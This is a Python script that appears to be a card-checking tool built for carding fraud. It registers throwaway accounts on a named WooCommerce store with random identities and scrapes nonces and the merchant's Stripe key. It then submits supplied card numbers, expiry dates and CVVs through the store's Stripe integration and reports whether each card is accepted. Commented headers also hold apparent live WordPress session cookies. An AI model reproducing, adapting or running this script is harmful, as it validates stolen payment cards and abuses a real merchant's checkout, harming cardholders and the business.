import requests , re,random , string
from datetime import datetime
from proxy import proxies

son = requests.get("https://randomuser.me/api/?nat=us", 
                                timeout=15).json()
firstn = son['results'][0]['name']['first']
email = son['results'][0]['email']
def find_between(text, startStr, endStr):
    startIndex = text.find(startStr)
    if startIndex == -1:
        return ""
    startIndex += len(startStr)
    endIndex = text.find(endStr, startIndex)
    if endIndex == -1:
        return ""
    return text[startIndex:endIndex]

def generate_boundary():
    return 'WebKitFormBoundary' + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
async def stripe_auth2(cc,mm,yy,cvv):
    r = requests.session()
    web = generate_boundary()
    username = firstn + random.choice(string.ascii_lowercase)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-23%2007%3A41%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fnevawargames.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-23%2007%3A41%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fnevawargames.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F128.0.0.0%20Safari%2F537.36; _ga=GA1.1.245858647.1727079078; cookieyes-consent=consentid:VHc3d09BNWFKRUNuRmZ3dmxzMm5QaVY3SlpHV3FNd1M,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fnevawargames.com%2Fmy-account%2Fadd-payment-method%2F; _ga_1NSY3LBPPM=GS1.1.1727079077.1.1.1727079342.0.0.0',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    }
    try:
        response = r.get('https://nevawargames.com/my-account/', headers=headers)
        reg_nonce = re.findall(r'name="woocommerce-register-nonce" value="(.*?)"', response.text)[0]
    except:
        return '[Stripe Error] => Error: getting register nonce'
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-23%2007%3A41%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fnevawargames.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-23%2007%3A41%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fnevawargames.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F128.0.0.0%20Safari%2F537.36; _ga=GA1.1.245858647.1727079078; cookieyes-consent=consentid:VHc3d09BNWFKRUNuRmZ3dmxzMm5QaVY3SlpHV3FNd1M,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fnevawargames.com%2Fmy-account%2F; _ga_1NSY3LBPPM=GS1.1.1727079077.1.1.1727079545.0.0.0',
        'origin': 'https://nevawargames.com',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://nevawargames.com/my-account/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    }

    data = {
        'username': username,
        'email': email,
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_session_entry': 'https://nevawargames.com/my-account/add-payment-method/',
        'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'wc_order_attribution_session_pages': '4',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
        'woocommerce-register-nonce': reg_nonce,
        '_wp_http_referer': '/my-account/',
        'register': 'Register',
    }
    try:
        response = r.post('https://nevawargames.com/my-account/', headers=headers, data=data)
    except:
        return '[Stripe Error] => Error: registering account'
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-23%2007%3A41%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fnevawargames.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-23%2007%3A41%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fnevawargames.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; _ga=GA1.1.245858647.1727079078; cookieyes-consent=consentid:VHc3d09BNWFKRUNuRmZ3dmxzMm5QaVY3SlpHV3FNd1M,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes; wordpress_logged_in_6b3723af481a27f5a35d417d5b9570ac=Zyan223%7C1728289144%7CwBVcK42T2CHaY0PyiFh3R9Jaw78wo0rD90KViX6sbrB%7Cd18462d1fdd063626dacaadb448afa1271e6a99c7aa7704b146392162474397d; tinv_wishlistkey=c8f699; tinvwl_wishlists_data_counter=0; tinvwl_wishlists_data_stats=138; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F128.0.0.0%20Safari%2F537.36; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fnevawargames.com%2Fmy-account%2Fpayment-methods%2F; _ga_1NSY3LBPPM=GS1.1.1727083857.2.1.1727083966.0.0.0',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://nevawargames.com/my-account/payment-methods/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    }
    try:
        response = r.get('https://nevawargames.com/my-account/add-payment-method/', headers=headers)
        setup_instance = re.findall(r'"createSetupIntentNonce":\s*"([^"]+)"', response.text)[0]
        pk = find_between(response.text, '"publishableKey":"', '"').strip()
    except:
        return '[Stripe Error] => Error: getting setup instance'
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    }
    data = {
        "type": "card",
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_year]": yy,
        "card[exp_month]": mm,
        "allow_redisplay": "unspecified",
        "billing_details[address][postal_code]": "10080",
        "billing_details[address][country]": "US",
        "pasted_fields": "number",
        "payment_user_agent": "stripe.js/f22f608063; stripe-js-v3/f22f608063; payment-element; deferred-intent",
        "referrer": "https://nevawargames.com",
        "client_attribution_metadata[client_session_id]": "b4820772-47d9-4e5f-817c-c57a57ee6d82",
        "client_attribution_metadata[merchant_integration_source]": "elements",
        "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
        "client_attribution_metadata[merchant_integration_version]": "2021",
        "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
        "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
        "guid": "NA",
        "muid": "NA",
        "sid": "NA",
        "key": pk,
        "_stripe_account": "acct_1Pa1ONCEyRs8Osm8"
    }
    try:
        response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        pm = response.json()['id']
    except:
        return '[Stripe Error] => Error: creating payment method'
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': f'multipart/form-data; boundary=----{web}',
        # 'cookie': 'wordpress_sec_6b3723af481a27f5a35d417d5b9570ac=Zyan223%7C1728289144%7CwBVcK42T2CHaY0PyiFh3R9Jaw78wo0rD90KViX6sbrB%7Cf4aa117e737fe01ca575edc2b7c8bfd5605b5db32fbd8438635ab34696a0b4e4; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-23%2007%3A41%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fnevawargames.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-23%2007%3A41%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fnevawargames.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; _ga=GA1.1.245858647.1727079078; cookieyes-consent=consentid:VHc3d09BNWFKRUNuRmZ3dmxzMm5QaVY3SlpHV3FNd1M,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes; wordpress_logged_in_6b3723af481a27f5a35d417d5b9570ac=Zyan223%7C1728289144%7CwBVcK42T2CHaY0PyiFh3R9Jaw78wo0rD90KViX6sbrB%7Cd18462d1fdd063626dacaadb448afa1271e6a99c7aa7704b146392162474397d; tinv_wishlistkey=c8f699; tinvwl_wishlists_data_counter=0; tinvwl_wishlists_data_stats=138; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F128.0.0.0%20Safari%2F537.36; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fnevawargames.com%2Fmy-account%2Fadd-payment-method%2F; __ssid=29a51ffcf407e2e3fc3c32b5b119966; _ga_1NSY3LBPPM=GS1.1.1727083857.2.1.1727084356.0.0.0',
        'origin': 'https://nevawargames.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://nevawargames.com/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    }

    data = f'''
------{web}
Content-Disposition: form-data; name="action"

create_setup_intent
------{web}
Content-Disposition: form-data; name="wcpay-payment-method"

{pm}
------{web}
Content-Disposition: form-data; name="_ajax_nonce"

{setup_instance}
------{web}--'''
    try:
        response = r.post('https://nevawargames.com/wp-admin/admin-ajax.php',headers=headers,data=data)
        if response.status_code == 200 and '"success":true' in response.text:
            return 'Succeeded'
        elif response.status_code == 400 or '"success":false' in response.text:
            msg = find_between(response.text, '"message":"Error: ', '"')
            return msg
        elif 'required_action' in response.text:
            msg = '3D Secure Required'
            return msg
        else:
            msg = response['data']['error']['message']
            return msg
    except:
        return 'Unknown error occurred'